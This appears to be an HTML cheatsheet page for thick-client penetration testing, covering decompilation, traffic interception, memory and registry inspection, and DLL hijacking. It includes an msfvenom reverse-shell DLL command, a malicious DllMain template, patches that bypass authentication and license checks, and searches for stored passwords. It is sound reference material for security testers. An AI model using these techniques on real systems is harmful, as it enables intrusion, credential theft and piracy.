@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thick Client Testing Cheatsheet | maeitsec</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root{--bg-primary:#0a0a0f;--bg-secondary:#12121a;--bg-tertiary:#1a1a24;--accent:#00ff88;--accent-dim:#00cc6a;--accent-glow:rgba(0,255,136,0.15);--text-primary:#e4e4e7;--text-secondary:#a1a1aa;--text-muted:#71717a;--border:#27272a;--red:#ff4757;--yellow:#ffa502;--blue:#3b82f6;--purple:#a855f7;--orange:#f97316}*{margin:0;padding:0;box-sizing:border-box}html{scroll-behavior:smooth}body{font-family:'Inter',sans-serif;background:var(--bg-primary);color:var(--text-primary);line-height:1.6}nav{position:fixed;top:0;width:100%;padding:1rem 2rem;background:rgba(10,10,15,0.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--border);z-index:1000;display:flex;justify-content:space-between;align-items:center}.logo{font-family:'JetBrains Mono',monospace;font-size:1.25rem;font-weight:700;color:var(--accent);text-decoration:none}.logo span{color:var(--text-primary)}.back-link{color:var(--text-secondary);text-decoration:none;font-size:0.9rem}.back-link:hover{color:var(--accent)}.container{max-width:1400px;margin:0 auto;padding:5rem 2rem 3rem;display:grid;grid-template-columns:250px 1fr;gap:3rem}.sidebar{position:sticky;top:5rem;height:fit-content}.sidebar-title{font-size:0.75rem;text-transform:uppercase;letter-spacing:0.1em;color:var(--text-muted);margin-bottom:1rem}.sidebar-nav{list-style:none}.sidebar-nav li{margin-bottom:0.25rem}.sidebar-nav a{display:block;padding:0.5rem 1rem;color:var(--text-secondary);text-decoration:none;font-size:0.9rem;border-left:2px solid transparent}.sidebar-nav a:hover{color:var(--accent);border-left-color:var(--accent);background:var(--accent-glow)}.content{min-width:0}.page-header{margin-bottom:3rem;padding-bottom:2rem;border-bottom:1px solid var(--border)}.page-header h1{font-size:2.5rem;margin-bottom:0.5rem}.page-header p{color:var(--text-secondary);font-size:1.1rem}.section{margin-bottom:3rem;scroll-margin-top:5rem}.section-title{display:flex;align-items:center;gap:0.75rem;font-size:1.5rem;margin-bottom:1.5rem;color:var(--accent)}.section-title::after{content:'';flex:1;height:1px;background:var(--border)}.code-block{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;margin-bottom:1.5rem;overflow:hidden}.code-header{display:flex;justify-content:space-between;align-items:center;padding:0.75rem 1rem;background:var(--bg-tertiary);border-bottom:1px solid var(--border)}.code-title{font-size:0.85rem;color:var(--text-secondary);font-weight:500}.code-tag{font-size:0.7rem;padding:0.2rem 0.5rem;border-radius:4px;font-family:'JetBrains Mono',monospace}.tag-dotnet{background:rgba(168,85,247,0.2);color:var(--purple)}.tag-java{background:rgba(255,165,2,0.2);color:var(--yellow)}.tag-memory{background:rgba(255,71,87,0.2);color:var(--red)}.tag-traffic{background:rgba(0,255,136,0.2);color:var(--accent)}.tag-dll{background:rgba(59,130,246,0.2);color:var(--blue)}.code-content{padding:1rem;overflow-x:auto}.code-content pre{font-family:'JetBrains Mono',monospace;font-size:0.85rem;line-height:1.6;color:var(--text-primary);white-space:pre-wrap;word-break:break-all}.code-content .comment{color:var(--text-muted)}.copy-btn{background:var(--bg-tertiary);border:1px solid var(--border);color:var(--text-secondary);padding:0.3rem 0.6rem;border-radius:4px;font-size:0.75rem;cursor:pointer}.copy-btn:hover{background:var(--accent);color:var(--bg-primary)}.info-box{background:var(--bg-secondary);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:8px;padding:1rem 1.25rem;margin-bottom:1.5rem}.info-box-title{font-weight:600;margin-bottom:0.5rem}.info-box p{color:var(--text-secondary);font-size:0.95rem}footer{text-align:center;padding:2rem;border-top:1px solid var(--border);color:var(--text-muted);font-size:0.85rem}@media(max-width:900px){.container{grid-template-columns:1fr;padding-top:4rem}.sidebar{display:none}}
+    </style>
+</head>
+<body>
+    <nav>
+        <a href="../index.html" class="logo">&lt;<span>maeitsec</span>/&gt;</a>
+        <a href="../index.html#cheatsheets" class="back-link">← Back to Cheatsheets</a>
+    </nav>
+
+    <div class="container">
+        <aside class="sidebar">
+            <div class="sidebar-title">On This Page</div>
+            <ul class="sidebar-nav">
+                <li><a href="#info">Information Gathering</a></li>
+                <li><a href="#dotnet">.NET Decompilation</a></li>
+                <li><a href="#java">Java Decompilation</a></li>
+                <li><a href="#traffic">Traffic Analysis</a></li>
+                <li><a href="#memory">Memory Analysis</a></li>
+                <li><a href="#dll">DLL Hijacking</a></li>
+                <li><a href="#storage">Data Storage</a></li>
+                <li><a href="#registry">Registry Analysis</a></li>
+                <li><a href="#debug">Debugging</a></li>
+                <li><a href="#tools">Tools</a></li>
+            </ul>
+        </aside>
+
+        <main class="content">
+            <header class="page-header">
+                <h1>🖥️ Thick Client Testing</h1>
+                <p>Comprehensive cheatsheet for thick client / desktop application penetration testing.</p>
+            </header>
+
+            <section id="info" class="section">
+                <h2 class="section-title">📋 Information Gathering</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Application Fingerprinting</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Identify application type</span>
+file application.exe
+
+<span class="comment"># Check for .NET</span>
+<span class="comment"># - Contains .NET metadata</span>
+<span class="comment"># - Imports from mscoree.dll</span>
+
+<span class="comment"># Check for Java</span>
+<span class="comment"># - .jar files or jre/jvm dependencies</span>
+<span class="comment"># - Contains META-INF folder</span>
+
+<span class="comment"># Check for Electron</span>
+<span class="comment"># - resources/app.asar file</span>
+<span class="comment"># - node_modules folder</span>
+
+<span class="comment"># PEiD / Detect It Easy (DiE)</span>
+<span class="comment"># - Identifies packers, compilers, protectors</span>
+
+<span class="comment"># Strings analysis</span>
+strings application.exe | grep -i "password\|key\|secret\|api"
+strings application.exe | grep -i "http\|https\|ftp"
+strings application.exe | grep -i "sql\|select\|insert"
+
+<span class="comment"># Architecture</span>
+<span class="comment"># 32-bit vs 64-bit - affects tool selection</span></pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Process Analysis</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Sysinternals Process Monitor</span>
+procmon.exe
+<span class="comment"># Filter: Process Name contains "AppName"</span>
+<span class="comment"># Watch for: File System, Registry, Network</span>
+
+<span class="comment"># Process Explorer</span>
+procexp.exe
+<span class="comment"># View: DLLs loaded, handles, threads</span>
+<span class="comment"># Check: Command line arguments, environment</span>
+
+<span class="comment"># TCPView - Network connections</span>
+tcpview.exe
+<span class="comment"># Watch: Outbound connections, ports</span>
+
+<span class="comment"># Process Hacker</span>
+<span class="comment"># Powerful alternative to Process Explorer</span>
+<span class="comment"># Memory inspection, token manipulation</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="dotnet" class="section">
+                <h2 class="section-title">🔷 .NET Decompilation</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">.NET Analysis Tools</span>
+                        <span class="code-tag tag-dotnet">.NET</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># dnSpy - Best for debugging + patching</span>
+<span class="comment"># Open .exe or .dll</span>
+<span class="comment"># Features:</span>
+<span class="comment"># - Decompile to C#</span>
+<span class="comment"># - Edit and recompile (Edit Method)</span>
+<span class="comment"># - Debug with breakpoints</span>
+<span class="comment"># - Search for strings, methods</span>
+
+<span class="comment"># ILSpy - Decompilation only</span>
+<span class="comment"># Lighter alternative to dnSpy</span>
+
+<span class="comment"># dotPeek (JetBrains)</span>
+<span class="comment"># Free decompiler with navigation</span>
+
+<span class="comment"># What to look for:</span>
+<span class="comment"># - Hardcoded credentials</span>
+<span class="comment"># - API keys / connection strings</span>
+<span class="comment"># - Encryption/decryption routines</span>
+<span class="comment"># - License validation logic</span>
+<span class="comment"># - SQL queries</span>
+<span class="comment"># - Authentication logic</span></pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">.NET Patching with dnSpy</span>
+                        <span class="code-tag tag-dotnet">.NET</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Bypass authentication check</span>
+<span class="comment"># Original:</span>
+public bool ValidateUser(string user, string pass) {
+    return CheckDatabase(user, pass);
+}
+
+<span class="comment"># Patched (Right-click → Edit Method):</span>
+public bool ValidateUser(string user, string pass) {
+    return true;  <span class="comment">// Always return true</span>
+}
+
+<span class="comment"># Bypass license check</span>
+<span class="comment"># Find: IsLicensed(), CheckLicense(), ValidateLicense()</span>
+<span class="comment"># Patch to return true</span>
+
+<span class="comment"># Remove trial restrictions</span>
+<span class="comment"># Find: TrialExpired, DaysRemaining</span>
+<span class="comment"># Patch conditions</span>
+
+<span class="comment"># Save patched module</span>
+<span class="comment"># File → Save Module</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="java" class="section">
+                <h2 class="section-title">☕ Java Decompilation</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Java Analysis</span>
+                        <span class="code-tag tag-java">Java</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Extract JAR</span>
+unzip application.jar -d extracted/
+jar -xvf application.jar
+
+<span class="comment"># JD-GUI - Decompiler with GUI</span>
+jd-gui application.jar
+
+<span class="comment"># CFR - Command line decompiler</span>
+java -jar cfr.jar application.jar --outputdir output/
+
+<span class="comment"># Procyon</span>
+java -jar procyon-decompiler.jar application.jar -o output/
+
+<span class="comment"># JADX (also for Android)</span>
+jadx application.jar -d output/
+jadx-gui application.jar
+
+<span class="comment"># Bytecode viewer - Multiple decompilers</span>
+java -jar Bytecode-Viewer.jar
+
+<span class="comment"># What to look for:</span>
+<span class="comment"># - JDBC connection strings</span>
+<span class="comment"># - Hardcoded passwords</span>
+<span class="comment"># - Encryption keys</span>
+<span class="comment"># - Serialization endpoints</span>
+<span class="comment"># - JNDI lookups (RCE potential)</span></pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Java Patching</span>
+                        <span class="code-tag tag-java">Java</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># 1. Decompile to .java</span>
+java -jar cfr.jar Target.class > Target.java
+
+<span class="comment"># 2. Modify the code</span>
+
+<span class="comment"># 3. Recompile</span>
+javac Target.java
+
+<span class="comment"># 4. Replace in JAR</span>
+jar -uf application.jar Target.class
+
+<span class="comment"># OR use Recaf (GUI tool)</span>
+<span class="comment"># - Edit bytecode directly</span>
+<span class="comment"># - Save modified JAR</span>
+
+<span class="comment"># Bypassing obfuscation</span>
+<span class="comment"># - ProGuard: Renames only, logic intact</span>
+<span class="comment"># - Allatori: String encryption</span>
+<span class="comment"># - Zelix KlassMaster: Flow obfuscation</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="traffic" class="section">
+                <h2 class="section-title">🔍 Traffic Analysis</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">HTTP/HTTPS Interception</span>
+                        <span class="code-tag tag-traffic">Traffic</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Burp Suite - HTTP proxy</span>
+<span class="comment"># Configure: Proxy → Options → Add listener</span>
+<span class="comment"># Install Burp CA in Windows cert store</span>
+
+<span class="comment"># Set system proxy</span>
+<span class="comment"># Settings → Network → Proxy → Manual</span>
+<span class="comment"># Or: netsh winhttp set proxy 127.0.0.1:8080</span>
+
+<span class="comment"># Fiddler - Alternative HTTP proxy</span>
+<span class="comment"># Good for .NET apps (same vendor)</span>
+
+<span class="comment"># mitmproxy - Command line</span>
+mitmproxy -p 8080
+
+<span class="comment"># Certificate pinning bypass:</span>
+<span class="comment"># 1. Find certificate validation code</span>
+<span class="comment"># 2. Patch to always return true</span>
+<span class="comment"># 3. Or replace embedded cert with Burp's</span></pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Non-HTTP Traffic</span>
+                        <span class="code-tag tag-traffic">Traffic</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Wireshark - Packet capture</span>
+<span class="comment"># Filter: tcp.port == 1234</span>
+<span class="comment"># Follow TCP stream</span>
+
+<span class="comment"># Echo Mirage - TCP proxy</span>
+<span class="comment"># Intercept and modify TCP traffic</span>
+<span class="comment"># Inject into running process</span>
+
+<span class="comment"># Nmap packet capture</span>
+nmap --packet-trace -p PORT TARGET
+
+<span class="comment"># tcpdump</span>
+tcpdump -i eth0 port 1234 -w capture.pcap
+
+<span class="comment"># For encrypted non-HTTP:</span>
+<span class="comment"># 1. Find encryption routine in code</span>
+<span class="comment"># 2. Extract keys from memory</span>
+<span class="comment"># 3. Or hook encryption functions</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="memory" class="section">
+                <h2 class="section-title">🧠 Memory Analysis</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Memory Inspection</span>
+                        <span class="code-tag tag-memory">Memory</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Cheat Engine - Memory scanner</span>
+<span class="comment"># 1. Attach to process</span>
+<span class="comment"># 2. Search for known values</span>
+<span class="comment"># 3. Narrow down with changed values</span>
+<span class="comment"># 4. Modify memory directly</span>
+
+<span class="comment"># Process Hacker - Memory dump</span>
+<span class="comment"># Right-click process → Miscellaneous → Dump</span>
+
+<span class="comment"># Strings from memory dump</span>
+strings memdump.dmp | grep -i password
+strings -el memdump.dmp  <span class="comment"># Unicode strings</span>
+
+<span class="comment"># WinDbg - Advanced debugging</span>
+.attach PID
+!heap -p -a ADDRESS
+db ADDRESS L100  <span class="comment"># Dump bytes</span>
+
+<span class="comment"># Volatility (memory forensics)</span>
+volatility -f memdump.dmp --profile=Win10x64 pslist
+volatility -f memdump.dmp --profile=Win10x64 memdump -p PID -D output/
+
+<span class="comment"># Look for:</span>
+<span class="comment"># - Credentials in plaintext</span>
+<span class="comment"># - Decrypted data</span>
+<span class="comment"># - Session tokens</span>
+<span class="comment"># - API keys</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="dll" class="section">
+                <h2 class="section-title">📚 DLL Hijacking</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">DLL Hijacking Detection</span>
+                        <span class="code-tag tag-dll">DLL</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Process Monitor - Find missing DLLs</span>
+procmon.exe
+<span class="comment"># Filter: Result = NAME NOT FOUND</span>
+<span class="comment"># Filter: Path ends with .dll</span>
+<span class="comment"># Look for writable locations before System32</span>
+
+<span class="comment"># DLL Search Order (Windows):</span>
+<span class="comment"># 1. Application directory</span>
+<span class="comment"># 2. System directory (C:\Windows\System32)</span>
+<span class="comment"># 3. 16-bit system directory</span>
+<span class="comment"># 4. Windows directory</span>
+<span class="comment"># 5. Current directory</span>
+<span class="comment"># 6. PATH environment variable</span>
+
+<span class="comment"># Check for writable app directory</span>
+icacls "C:\Program Files\App\"
+
+<span class="comment"># PowerSploit - Find DLL hijack opportunities</span>
+Find-ProcessDLLHijack
+Find-PathDLLHijack</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">DLL Hijacking Exploitation</span>
+                        <span class="code-tag tag-dll">DLL</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Create malicious DLL (msfvenom)</span>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll > hijack.dll
+
+<span class="comment"># Create DLL with proxy (maintain functionality)</span>
+<span class="comment"># Use DLL Export Viewer to find exports</span>
+<span class="comment"># Forward exports to original DLL</span>
+
+<span class="comment"># Simple C DLL template</span>
+#include &lt;windows.h&gt;
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        WinExec("calc.exe", 0);  // Or reverse shell
+    }
+    return TRUE;
+}
+
+<span class="comment"># Compile with MinGW</span>
+x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c
+
+<span class="comment"># Place in vulnerable path and restart app</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="storage" class="section">
+                <h2 class="section-title">💾 Data Storage Analysis</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Local Storage Locations</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Common storage locations</span>
+%APPDATA%\AppName\
+%LOCALAPPDATA%\AppName\
+%PROGRAMDATA%\AppName\
+C:\Users\Public\
+Application directory
+
+<span class="comment"># Configuration files</span>
+*.config, *.ini, *.xml, *.json
+app.config, web.config
+settings.json
+
+<span class="comment"># SQLite databases</span>
+*.db, *.sqlite, *.sqlite3
+
+<span class="comment"># Check for sensitive data:</span>
+<span class="comment"># - Stored credentials</span>
+<span class="comment"># - Connection strings</span>
+<span class="comment"># - API keys</span>
+<span class="comment"># - Session tokens</span>
+<span class="comment"># - Cached data</span>
+
+<span class="comment"># SQLite browser</span>
+sqlitebrowser database.db
+
+<span class="comment"># Strings search</span>
+findstr /si password *.config *.xml *.ini
+Get-ChildItem -Recurse | Select-String -Pattern "password"</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="registry" class="section">
+                <h2 class="section-title">🗝️ Registry Analysis</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Registry Inspection</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Common app registry locations</span>
+HKEY_CURRENT_USER\Software\AppName
+HKEY_LOCAL_MACHINE\SOFTWARE\AppName
+HKEY_CURRENT_USER\Software\Classes\
+
+<span class="comment"># Process Monitor - Registry activity</span>
+<span class="comment"># Filter: Operation contains Reg</span>
+
+<span class="comment"># RegShot - Before/after comparison</span>
+<span class="comment"># 1st shot → Install/run app → 2nd shot → Compare</span>
+
+<span class="comment"># Search registry</span>
+reg query HKCU\Software /s /f password
+reg query HKLM\SOFTWARE /s /f password
+
+<span class="comment"># PowerShell registry search</span>
+Get-ChildItem -Path HKCU:\Software -Recurse | Get-ItemProperty | Where-Object { $_ -match "password" }
+
+<span class="comment"># Export registry key</span>
+reg export HKCU\Software\AppName export.reg
+
+<span class="comment"># Look for:</span>
+<span class="comment"># - Stored credentials</span>
+<span class="comment"># - License keys</span>
+<span class="comment"># - Installation paths</span>
+<span class="comment"># - Configuration settings</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="debug" class="section">
+                <h2 class="section-title">🐛 Debugging</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Debugging Tools</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># x64dbg / x32dbg - Native debugging</span>
+<span class="comment"># Attach to process or open executable</span>
+<span class="comment"># Set breakpoints on API calls</span>
+<span class="comment"># Step through code</span>
+
+<span class="comment"># Useful breakpoints:</span>
+<span class="comment"># - recv, send (network)</span>
+<span class="comment"># - CreateFileA/W (file access)</span>
+<span class="comment"># - RegOpenKeyA/W (registry)</span>
+<span class="comment"># - MessageBoxA/W (dialogs)</span>
+<span class="comment"># - GetProcAddress (dynamic loading)</span>
+
+<span class="comment"># dnSpy - .NET debugging</span>
+<span class="comment"># Debug → Attach to Process</span>
+<span class="comment"># Set breakpoints in decompiled code</span>
+
+<span class="comment"># OllyDbg - Classic 32-bit debugger</span>
+
+<span class="comment"># WinDbg - Microsoft debugger</span>
+<span class="comment"># .attach PID</span>
+<span class="comment"># bp kernel32!CreateFileW</span>
+<span class="comment"># g (go)</span>
+
+<span class="comment"># API Monitor - API call tracing</span>
+<span class="comment"># Select APIs to monitor</span>
+<span class="comment"># See parameters and return values</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tools" class="section">
+                <h2 class="section-title">🛠️ Tools Summary</h2>
+                
+                <div class="info-box">
+                    <div class="info-box-title">Essential Tools by Category</div>
+                    <p>
+                    <strong>Static Analysis:</strong> dnSpy, ILSpy, JD-GUI, JADX, Ghidra, IDA Pro, Detect It Easy<br><br>
+                    <strong>Dynamic Analysis:</strong> x64dbg, OllyDbg, WinDbg, Process Monitor, Process Explorer, API Monitor<br><br>
+                    <strong>Network:</strong> Burp Suite, Wireshark, Echo Mirage, Fiddler, TCPView<br><br>
+                    <strong>Memory:</strong> Cheat Engine, Process Hacker, Volatility<br><br>
+                    <strong>Utility:</strong> Sysinternals Suite, Strings, RegShot, HxD (hex editor)
+                    </p>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <footer>
+        <p>&lt;maeitsec/&gt; | Thick Client Testing Cheatsheet</p>
+    </footer>
+
+    <script>
+        function copyCode(btn){const block=btn.closest('.code-block');const code=block.querySelector('pre').textContent;navigator.clipboard.writeText(code);btn.textContent='Copied!';setTimeout(()=>btn.textContent='Copy',2000);}
+    </script>
+</body>
+</html>
